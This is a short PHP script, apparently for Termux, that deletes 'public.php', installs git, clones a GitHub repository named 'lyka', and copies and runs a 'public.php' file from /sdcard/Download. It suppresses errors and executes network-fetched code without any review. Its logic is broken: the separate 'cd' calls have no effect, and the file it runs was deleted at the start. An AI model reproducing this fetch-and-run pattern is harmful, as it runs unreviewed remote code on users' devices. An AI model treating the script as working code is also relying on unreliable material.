<?php
@system("clear");
unlink('public.php');
@system("cd ..");
@system("cd ..");
@system("pkg install git");
@system("git clone https://github.com/nikura12/lyka");
@system("cd lyka");
@system("cd ..");
@system("cd ..");
@system("cp public.php /sdcard/Download");
@system("cd /sdcard/Download");
@system("php public.php");
?>

